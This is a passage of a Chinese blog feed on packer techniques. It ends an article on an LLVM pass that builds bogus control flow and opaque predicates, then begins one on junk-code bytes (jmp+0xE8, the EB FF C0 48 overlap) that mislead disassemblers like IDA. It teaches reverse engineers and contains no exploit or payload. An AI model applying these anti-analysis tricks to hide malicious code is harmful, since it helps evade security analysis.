&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 但是新克隆出来的基本块并没有任何前驱块，所以我们要对PHI Node的前驱块进行remap：
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="n">pn&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">dyn_cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">PHINode&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">inst&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="n">j&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">e&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pn&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getNumIncomingValues&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="n">j&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="o">++&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">Value&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">MapValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pn&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getIncomingBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">VMap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">RF_None&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">pn&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">setIncomingBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cast&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">BasicBlock&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 元数据
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">SmallVector&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">pair&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="kt">unsigned&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MDNode&lt;/span> &lt;span class="o">*&amp;gt;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">MDs&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">getAllMetadata&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">MDs&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 修复调试
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">inst&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">setDebugLoc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">originalInstIt&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getDebugLoc&lt;/span>&lt;span class="p">());&lt;/span>
&lt;span class="o">++&lt;/span>&lt;span class="n">originalInstIt&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 清理原来的 terminator，无条件从 altered 跳转到 original
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">altered&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">getTerminator&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">eraseFromParent&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">BranchInst&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">original&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">altered&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">altered&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>去除修复指令操作数和 PhiNode 的部分，其实就是复制了原始块的指令，然后将终结指令改成跳转到原始块而已。&lt;/p>
&lt;h3 id="35-编译和测试">3.5 编译和测试&lt;/h3>
&lt;p>使用 CMake 编译，在环境设置一节中已经说明了怎么配置，编译得到了 &lt;code>Hello.dll&lt;/code> 后用下面的案例程序测试。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;hello world&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>程序保存在 &lt;code>sample/sample.c&lt;/code>，测试命令如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="c1"># clang 编译得到 bitcode&lt;/span>
clang -emit-llvm .&lt;span class="se">\s&lt;/span>ample&lt;span class="se">\s&lt;/span>ample.c -c -o .&lt;span class="se">\s&lt;/span>ample&lt;span class="se">\s&lt;/span>ample.bc
&lt;span class="c1"># opt 启用 hello pass 创建混淆后的新 bitcode&lt;/span>
opt -enable-new-pm&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span> -load .&lt;span class="se">\b&lt;/span>uild&lt;span class="se">\H&lt;/span>ello.dll -hello .&lt;span class="se">\s&lt;/span>ample&lt;span class="se">\s&lt;/span>ample.bc -o .&lt;span class="se">\s&lt;/span>ample&lt;span class="se">\s&lt;/span>ample-optimized.bc
&lt;span class="c1"># llvm-dis 反汇编混淆后的 bitcode，得到 sample-optimized.ll ，可以拿来看混淆结果&lt;/span>
llvm-dis .&lt;span class="se">\s&lt;/span>ample&lt;span class="se">\s&lt;/span>ample-optimized.bc
&lt;span class="c1"># llc 将混淆后的 bitcode 编译出汇编文件，也可以编译出 obj 文件，用 -filetype=obj 就行&lt;/span>
&lt;span class="c1"># 注意 -O0，不然默认优化就会直接把我们伪造的分支给干掉&lt;/span>
llc .&lt;span class="se">\s&lt;/span>ample&lt;span class="se">\s&lt;/span>ample-optimized.bc -O0 -o .&lt;span class="se">\s&lt;/span>ample.s
&lt;span class="c1"># 用 clang 完成最后的汇编和链接&lt;/span>
clang sample.s -o sample.exe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>也可以用 opt 来获得混淆后的代码控制流视图。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">opt -enable-new-pm&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span> -dot-cfg -cfg-func-name&lt;span class="o">=&lt;/span>main .&lt;span class="se">\s&lt;/span>ample&lt;span class="se">\s&lt;/span>ample-optimized.bc
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-08/main.png"
width="755"
height="555"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-08/main_hu9fb641053a057b276abc5a630d791922_51045_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-08/main_hu9fb641053a057b276abc5a630d791922_51045_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="main"
class="gallery-image"
data-flex-grow="136"
data-flex-basis="326px"
>&lt;/p>
&lt;p>在IDA打开后看到的结果如下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211103141258015.png"
width="370"
height="668"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211103141258015_hu6b9a1833094321916938f7c8374d48d6_60703_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211103141258015_hu6b9a1833094321916938f7c8374d48d6_60703_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211103141258015"
class="gallery-image"
data-flex-grow="55"
data-flex-basis="132px"
>&lt;/p>
&lt;p>再来个更复杂的例子：&lt;a class="link" href="https://github.com/nnnewb/crackmes/blob/main/cm02/main.c" target="_blank" rel="noopener"
>main.c&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211103142352174.png"
width="314"
height="638"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211103142352174_hu6e7d17f0f44390d3241deebec431bcff_8522_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-08/image-20211103142352174_hu6e7d17f0f44390d3241deebec431bcff_8522_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211103142352174"
class="gallery-image"
data-flex-grow="49"
data-flex-basis="118px"
>&lt;/p>
&lt;h3 id="36-扩展不透明谓词">3.6 扩展：不透明谓词&lt;/h3>
&lt;p>参考文章：&lt;a class="link" href="https://reverseengineering.stackexchange.com/questions/1669/what-is-an-opaque-predicate" target="_blank" rel="noopener"
>what is an opaque predicate&lt;/a>&lt;/p>
&lt;p>PS：本人没有相关学术背景，内容东拼西凑，如果存在理解错误或者陈述不准确请指出。&lt;/p>
&lt;p>概括地说，不透明谓词就是“某种如果程序分析不够充分，就可能错过的东西”。学术上说不透明谓词是始终在一个方向上执行的分支，对程序创建者已知，对分析器未知。&lt;/p>
&lt;p>例如我们知道程序运行时，&lt;code>LoadLibraryA&lt;/code> 加载一个不存在的库会返回 &lt;code>null&lt;/code>，但分析器并不清楚我们运行的环境里是否真的存在/不存在这个库，对于分析器来说用&lt;code>LoadLibraryA&lt;/code>构造出来的条件跳转就是一个不透明谓词。&lt;/p>
&lt;p>那透明呢？不知道有没有这样的说法，不透明是分析器可能错过的东西的话，透明就是分析器不会错过的东西，比如 &lt;code>xor eax,eax&lt;/code> 再紧跟着 &lt;code>test eax,eax&lt;/code>，那么&lt;code>jnz&lt;/code>的走向对分析器来说就是已知的——除非分析器根本没这功能。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>首先是完整案例代码：&lt;a class="link" href="https://github.com/nnnewb/learning-packer/tree/main/packer8" target="_blank" rel="noopener"
>packer8 - GitHub&lt;/a>&lt;/p>
&lt;p>总结知识点：&lt;/p>
&lt;ul>
&lt;li>关键类型：&lt;code>Module&lt;/code>、&lt;code>Function&lt;/code>、&lt;code>BasicBlock&lt;/code>、&lt;code>Instruction&lt;/code> &amp;hellip;&lt;/li>
&lt;li>PhiNode&lt;/li>
&lt;li>终结指令，&lt;code>BranchInst&lt;/code>、&lt;code>ReturnInst&lt;/code>&lt;/li>
&lt;li>LLVM 工具链：&lt;code>opt&lt;/code>、&lt;code>llc&lt;/code>、&lt;code>lli&lt;/code>、&lt;code>llvm-dis&lt;/code>&lt;/li>
&lt;li>关于 new pass manager 的坑：&lt;code>-fno-experimental-new-pass-manager&lt;/code>、&lt;code>-enable-new-pm=0&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>用 opt 单独搞混淆很麻烦，也不能集成到已有的 cmake/make 项目里。用 clang 加载混淆器的只需要这样：&lt;code>-Xclang -load -Xclang bcf.dll -fno-experimental-new-pass-manager&lt;/code> 就可以直接使用 &lt;code>bcf.dll&lt;/code> 参与混淆啦。&lt;/p>
&lt;p>LLVM 13.x 版本的新 pass manager 带来了很多问题，主要是 LLVM 的文档没写怎么把 Pass 注册到新的 PM 里，结果 opt 能跑 clang 又没运行 pass ，就搜来搜去花了很多时间&amp;hellip;不过实际动手写过之后会发现 LLVM 是个大宝库，特别适合发挥想象。Pass 来扩展编译器功能还是挺方便扩展的，也能一窥LLVM内部的奇妙世界。&lt;/p>
&lt;p>原本还打算看看控制流扁平化，毕竟OLLVM都已经开始看了，控制流扁平化不看一下感觉有点说不过去。但是实际上手发现没耐心再读一遍这代码了=。=也许下次。OLLVM代码解读好像有不少帖子了吧，不献丑了。控制流扁平化的代码量也不是很多，慢慢读还是能捋清楚逻辑的。&lt;/p>
&lt;p>另外还可以发挥想象：能不能用 LLVM Pass 往代码里插入花指令？&lt;/p>
&lt;p>参考资料：&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://llvm.org/docs/CMake.html#cmake-out-of-source-pass" target="_blank" rel="noopener"
>CMake out of source pass - LLVM&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://llvm.org/docs/WritingAnLLVMPass.html" target="_blank" rel="noopener"
>Writing an LLVM Pass - LLVM&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://mukulrathi.com/create-your-own-programming-language/llvm-ir-cpp-api-tutorial/" target="_blank" rel="noopener"
>LLVM IR C++ API Tutorial&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://mayuyu.io/2018/06/04/PhiNode-in-LLVM/" target="_blank" rel="noopener"
>PhiNode in LLVM&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.quora.com/How-do-Terminators-work-in-the-LLVM-IR" target="_blank" rel="noopener"
>How do Terminator work in LLVM IR&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://llvm.org/docs/CommandGuide/index.html" target="_blank" rel="noopener"
>LLVM Command Guide&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://bbs.pediy.com/thread-266201.htm" target="_blank" rel="noopener"
>OLLVM 虚假控制流源码学习笔记 - 看雪论坛&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github1s.com/0x3f97/ollvm-12.x/blob/HEAD/README.md" target="_blank" rel="noopener"
>0x3f97/ollvm-12.x&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>加壳原理07 - 花指令入门</title><link>https://nnnewb.github.io/blog/p/learning-packer-07/</link><pubDate>Sun, 31 Oct 2021 17:14:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/learning-packer-07/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/learning-packer-07/cover.jpg" alt="Featured image of post 加壳原理07 - 花指令入门" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>个人浅见，一般分析一个程序可以有动态和静态两条路，动态一般指的就是调试或者别的运行时跟踪程序行为的方式了，除了调试器外就是抓取事件、日志、API调用记录、看内存数据等，比如有 Frida，还有内存搜索如CE。静态则是用各种工具在不实际运行程序的前提下，从程序文件里提取有用的信息。&lt;/p>
&lt;p>对于运行时的对抗手段很多，毕竟程序都跑起来了，你来我往打擂台嘛。而且在Windows这个闭源平台上，还可以靠不大可能被动手脚的内核来保护自己，Linux上就可能内核都是被魔改过的。&lt;/p>
&lt;p>但是对静态分析就没有什么特别好的办法，又要人造的计算机能正确运行，又要人不能理解，就有点矛盾。&lt;/p>
&lt;p>广为人知的对抗静态分析的手段有这些：&lt;/p>
&lt;ol>
&lt;li>混淆，把程序逻辑转换成更晦涩但等价的形式。&lt;/li>
&lt;li>加花，对抗反汇编引擎，利用反汇编工具的算法缺陷、漏洞来迫使分析者必须花费大量时间处理错误的反汇编结果，让诸如控制流视图之类的工具失效。&lt;/li>
&lt;/ol>
&lt;p>混淆和加花的主要区别 &lt;strong>在我这&lt;/strong> 定义为 &lt;strong>混淆是变换原程序逻辑，花指令不改变原程序逻辑&lt;/strong> 。&lt;/p>
&lt;p>这些对抗手段主要的目的都是 &lt;strong>消磨耐心&lt;/strong> 和 &lt;strong>拖延时间&lt;/strong> ，抬高人肉分析的成本。但混淆加花这种手段是无法做到只让机器读懂代码而人读不懂这种效果的。这个结论忘了是哪篇论文里提到的了。&lt;/p>
&lt;p>本篇只讲如何对抗反汇编，也就是花指令技术。&lt;/p>
&lt;h2 id="0x01-花指令原理">0x01 花指令原理&lt;/h2>
&lt;h3 id="11-机器码指令格式">1.1 机器码指令格式&lt;/h3>
&lt;p>码农日常工作接触的是高级语言（这个概念可能有争议，反正相对汇编、机器码这个层级来说都是高级语言就对了），汇编和机器码这种满是历史尘埃的领域是绝无机会接触的。但要理解花指令，首先要理解汇编代码的二进制表示，才会明白为什么反汇编工具的力量是有极限的。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-07/zHClf.png"
width="658"
height="368"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-07/zHClf_hu3ca7a186b6a8e60fb2df5f6ffb33e0d4_25027_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-07/zHClf_hu3ca7a186b6a8e60fb2df5f6ffb33e0d4_25027_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="zHClf"
class="gallery-image"
data-flex-grow="178"
data-flex-basis="429px"
>&lt;/p>
&lt;p>这是 Intel 的 &lt;a class="link" href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf" target="_blank" rel="noopener"
>64-ia-32-architectures-software-developer-instruction-set-reference-manual&lt;/a> 里的一张图，说明了汇编指令如何以二进制形式保存。可以简单看成3部分，1字节的可选前缀，1-3字节的opcode部分，剩余描述操作数的部分。&lt;/p>
&lt;p>几个要素：&lt;/p>
&lt;ol>
&lt;li>指令长度不固定，最短 1 字节，最长可能有 14 （图中全部相加，实际会不会有我就不知道了）。&lt;/li>
&lt;li>一条&lt;strong>汇编代码里的指令&lt;/strong>可能对应很多不同的 opcode ，简单到 &lt;code>add&lt;/code> 这样的指令也会有很多种不同形式。&lt;/li>
&lt;/ol>
&lt;p>熟悉机器码格式在自己构造花指令的时候大概会有用，但实话说 Intel 这手册看得我头痛。所以还是直接快进到花指令原理。&lt;/p>
&lt;h3 id="12-花指令原理">1.2 花指令原理&lt;/h3>
&lt;p>花指令的英文是 &lt;em>junk code&lt;/em> ，也就是垃圾代码。实际上花指令的确是一些不影响程序逻辑的 &lt;em>垃圾&lt;/em> 机器码，它存在的唯一意义就是干扰反汇编引擎和人肉分析。&lt;/p>
&lt;p>花指令有两种类型：&lt;/p>
&lt;ul>
&lt;li>不可执行的花指令&lt;/li>
&lt;li>可执行的花指令&lt;/li>
&lt;/ul>
&lt;p>听起来像是废话但实际上构造这两种花指令的难度是完全不一样的。&lt;/p>
&lt;p>对于不可执行的花指令，本质上我们做的事情是在跳转指令之后插入一个多字节指令的字节，欺骗反汇编器将这个字节之后的几个字节当成一个多字节指令解释，进而造成后续指令反汇编出错。&lt;/p>
&lt;p>而可执行的花指令，本质是将指令的组成部分重新解释执行。像是一个2字节的跳转指令，第二个字节是操作数，但操作数可以是 &lt;code>0xff&lt;/code>，也就是带符号的 &lt;code>-1&lt;/code>，使 EIP 落在 &lt;code>0xff&lt;/code> 这个字节上，将&lt;code>0xff&lt;/code>作为指令继续执行。这个过程中&lt;code>0xff&lt;/code>既可以被当成数字&lt;code>0xff&lt;/code>解释，也被当成了指令来解释。&lt;/p>
&lt;h3 id="13-反汇编算法">1.3 反汇编算法&lt;/h3>
&lt;p>目前常见反汇编算法就两类，一类是线性反汇编，对输入的数据逐字节翻译成汇编代码。这种反汇编算法多数时候工作地很好，但属于老实人，认为指令总是一个接一个出现，一个简单地在&lt;code>jmp&lt;/code>后插入&lt;code>0xe8&lt;/code>就能骗到。&lt;/p>
&lt;p>另一类是基于代码流分析的算法，这类算法的特点是不会无脑地继续反汇编跳转指令之后的代码，而是去优先反汇编 &lt;strong>可达&lt;/strong> 的代码。像是我们在 C 里面写 &lt;code>if (1) {} else { /* junk code */ }&lt;/code>，对于足够聪明的编译器，&lt;code>else&lt;/code> 分支就是明确无误的垃圾。对于这种反汇编算法，可以通过可执行的花指令来欺骗，或构造反汇编器无法判断真假的恒真/恒假分支，再插入不可执行的花指令来达到欺骗效果。&lt;/p>
&lt;h2 id="0x02-花指令案例">0x02 花指令案例&lt;/h2>
&lt;h3 id="21-e8-和线性反汇编算法">2.1 &lt;code>E8&lt;/code> 和线性反汇编算法&lt;/h3>
&lt;p>&lt;code>E8&lt;/code> 是 &lt;code>call&lt;/code> 指令的 opcode。opcode &lt;em>operation code&lt;/em> 也叫指令机器码 &lt;em>Instruction Machine Code&lt;/em>，就是汇编指令翻译后的二进制形式。贴一个 &lt;a class="link" href="https://en.wikipedia.org/wiki/X86_instruction_listings" target="_blank" rel="noopener"
>wiki 百科的 x86 指令列表&lt;/a> 以供参考。还有 &lt;a class="link" href="https://c9x.me/x86/html/file_module_x86_id_26.html" target="_blank" rel="noopener"
>x86 instruction set reference&lt;/a> 。还有 &lt;a class="link" href="https://stackoverflow.com/questions/44882315/how-does-the-cpu-distinguish-call-rel16-e8-cw-and-call-rel32-e8-cd" target="_blank" rel="noopener"
>How does the CPU distinguish &amp;lsquo;CALL rel16&amp;rsquo; (E8 cw) and &amp;lsquo;CALL rel32&amp;rsquo; (E8 cd)?&lt;/a>&lt;/p>
&lt;p>我们的程序运行在用户模式（32位）模式下，&lt;code>E8&lt;/code> 指令后紧跟着的是4字节的相对偏移，一条完整的 &lt;code>E8&lt;/code> 指令会使用 5 个字节的空间。&lt;/p>
&lt;p>下面是一个 &lt;code>E8&lt;/code> 花指令的案例，需要 MinGW 编译，对 x32dbg 有效。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#define ANTI_LINEAR_DISASSEMBLE_ALGORITHM_1 asm(&amp;#34;jmp next\n.byte 0xe8;\nnext:\n&amp;#34;)
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">start&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">ANTI_LINEAR_DISASSEMBLE_ALGORITHM_1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>编译命令&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">gcc demo.c &lt;span class="s1">&amp;#39;-Wl,--entry=_start&amp;#39;&lt;/span> -nodefaultlibs -nostartfiles -o demo
&lt;/code>&lt;/pre>&lt;/div>&lt;p>调试器内的效果&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211028152219524.png"
width="1175"
height="501"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211028152219524_hu2408fa036d3a5e5647fcc1f6e2c0b730_66690_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211028152219524_hu2408fa036d3a5e5647fcc1f6e2c0b730_66690_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211028152219524"
class="gallery-image"
data-flex-grow="234"
data-flex-basis="562px"
>&lt;/p>
&lt;p>可以看到在 &lt;code>jmp&lt;/code> 指令后，反汇编出了一条 &lt;code>call&lt;/code> 指令。但实际上我们写的代码里是没有任何函数调用的。而在这个 &lt;code>E8&lt;/code> 后面的 &lt;code>B8 00 00 00 00 5D C3&lt;/code> 才是真正会执行的代码：&lt;/p>
&lt;pre>&lt;code>mov eax, 0 ; B8 00 00 00 00
pop ebp ; 5D
retn ; C3
&lt;/code>&lt;/pre>&lt;p>参考&lt;a class="link" href="http://www.mathemainzel.info/files/x86asmref.html#pop" target="_blank" rel="noopener"
>intel 80x86 assembly language opcodes&lt;/a>。&lt;/p>
&lt;p>如果仔细看 &lt;code>jmp&lt;/code> 后的偏移 &lt;code>01&lt;/code> 的话也能猜到下一个 &lt;code>E8&lt;/code> 是不会被执行的。&lt;/p>
&lt;p>像是这种简单的花指令在 IDA 里没用，IDA 的反汇编算法会根据控制流分析来判断哪些内容不会被执行，进而产生下面的结果。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211028153421508.png"
width="796"
height="478"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211028153421508_hu997bdc75332333c1639f8a4c89fbdacd_51145_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211028153421508_hu997bdc75332333c1639f8a4c89fbdacd_51145_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211028153421508"
class="gallery-image"
data-flex-grow="166"
data-flex-basis="399px"
>&lt;/p>
&lt;h3 id="22--ida-和代码流反汇编算法">2.2 IDA 和代码流反汇编算法&lt;/h3>
&lt;p>关于IDA的反汇编算法描述是来自《恶意代码分析实战》。&lt;/p>
&lt;blockquote>
&lt;p>前面讨论的简单对抗反汇编技术是巧妙地在条件跳转指令之后放一个字节，这种技术的思路是，从这个字节开始反汇编，阻止其后真正的指令被反汇编，因为插入的字节是一个多字节指令的机器码。我们称这样的字节是流氓字节，因为它不属于程序的一部分，只是用在代码段迷惑反汇编器。&lt;/p>
&lt;/blockquote>
&lt;p>IDA的反汇编算法是针对代码流的反汇编，基本思路是记录反汇编过程中的跳转地址作为下一次反汇编的起点，当控制流转移（&lt;code>jmp&lt;/code>之类的跳转指令）时，并不是从跳转指令之后继续反汇编，而是从之前记录的跳转地址里选一个，开始新的反汇编工作。如上面的 &lt;code>jmp&lt;/code> + &lt;code>e8&lt;/code> 就无法对抗这种反汇编算法。&lt;/p>
&lt;p>目前实践中也发现，IDA 已经可以识别出一些例如 &lt;code>jz&lt;/code>+&lt;code>jnz&lt;/code> 制造的无条件跳转，通过控制流指令制造恒真或恒假条件来跳转大概会往更加复杂、高开销的方向走：比如利用系统API、环境中的已知常量作为条件去欺骗IDA，让 IDA 无法轻易认定某条分支是无效分支，进而干扰反汇编结果。&lt;/p>
&lt;p>那么除了插入多字节指令还有什么办法对抗代码流分析算法呢？&lt;/p>
&lt;blockquote>
&lt;p>&amp;hellip;但是，如果流氓字节不能被忽略怎么办？如果它是合法指令的一部分，且在运行时能够被正确执行怎么办？这里，我们碰到一个棘手的问题，所有给定字节都是多字节指令的一部分，而且它们都能够被执行。目前业内没有一个反汇编器能够将单个字节表示为两条指令的组成部分，然而处理器没有这种限制。&lt;/p>
&lt;/blockquote>
&lt;p>下面是一个案例。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="p">.&lt;/span>&lt;span class="n">byte&lt;/span> &lt;span class="mh">0xeb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xff&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xc0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x48&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>0xeb&lt;/code> &lt;code>jmp&lt;/code> 指令的 opcode，是一个 2 字节指令。&lt;code>0xff&lt;/code> 被解释为 &lt;code>-1&lt;/code>。&lt;/p>
&lt;p>&lt;code>0xff&lt;/code> 是 &lt;code>INC&lt;/code> 的机器码，&lt;code>0xc0&lt;/code>是操作数，表示 &lt;code>eax&lt;/code>，也就是 &lt;code>inc eax&lt;/code>。可以在这个&lt;a class="link" href="https://defuse.ca/online-x86-assembler.htm" target="_blank" rel="noopener"
>在线反汇编&lt;/a>网站上验证。&lt;/p>
&lt;p>&lt;code>0x48&lt;/code> 则是 &lt;code>dec eax&lt;/code> 的汇编指令，因此这4个字节执行后最终不会影响 &lt;code>eax&lt;/code> 的值。&lt;/p>
&lt;p>在这里，&lt;code>0xff&lt;/code> 同时被解释为 &lt;code>jmp&lt;/code> 的操作数和 &lt;code>inc&lt;/code> 指令，并且能正常执行，但反汇编器则会被迷惑。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211030211603863.png"
width="910"
height="177"
